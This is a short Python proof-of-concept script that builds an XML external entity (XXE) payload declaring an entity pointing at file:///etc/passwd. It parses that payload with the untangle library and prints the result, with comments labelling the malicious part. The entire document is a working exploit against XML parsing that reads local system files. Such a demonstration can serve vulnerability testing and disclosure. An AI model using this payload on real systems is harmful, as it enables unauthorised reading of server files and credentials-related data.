import untangle

# Example of XML input that could be used to exploit the vulnerability
xml_input = """
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- This is the malicious part -->
]>
<root>
  <data>&xxe;</data>  <!-- This will trigger the external entity -->
</root>
"""

# Function to parse XML using the untangle library
def parse_xml(xml_string):
    try:
        obj = untangle.parse(xml_string)
        return obj
    except Exception as e:
        print(f"Error parsing XML: {e}")

# Attempt to parse the malicious XML
result = parse_xml(xml_input)
print(result)